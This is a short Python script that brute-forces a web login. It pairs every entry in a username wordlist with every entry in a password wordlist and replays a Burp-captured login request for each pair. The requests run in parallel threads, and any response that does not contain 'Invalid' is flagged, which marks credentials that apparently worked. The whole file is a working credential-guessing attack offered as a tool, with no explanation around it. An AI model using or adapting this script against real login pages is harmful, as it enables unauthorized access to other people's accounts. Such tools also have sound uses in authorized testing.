#!/usr/bin/env python3
import concurrent.futures
import re
import burp_request_parser as brp
invalid_detector_pattern = re.compile(r"Invalid")
iterator = []
with open("username.txt", "r") as usernames:
    for username in usernames:
        with open("password.txt", "r") as passwords:
            for password in passwords:
                object = {"username": username.strip(
                ), "password": password.strip()}
                iterator.append(object)
print(iterator)
result_objects = []
with concurrent.futures.ThreadPoolExecutor() as executor:
    for mod_object in iterator:
        kick = executor.submit(
            brp.make_request, "request.txt", params_mod=mod_object)
        result_objects.append(kick)

for result in result_objects:
    result = result.result()
    check = invalid_detector_pattern.findall(result[0].text)
    if(len(check) > 0):
        print(f"{check[0]} {result[1]}")
    else:
        print(f"{result[1]}")
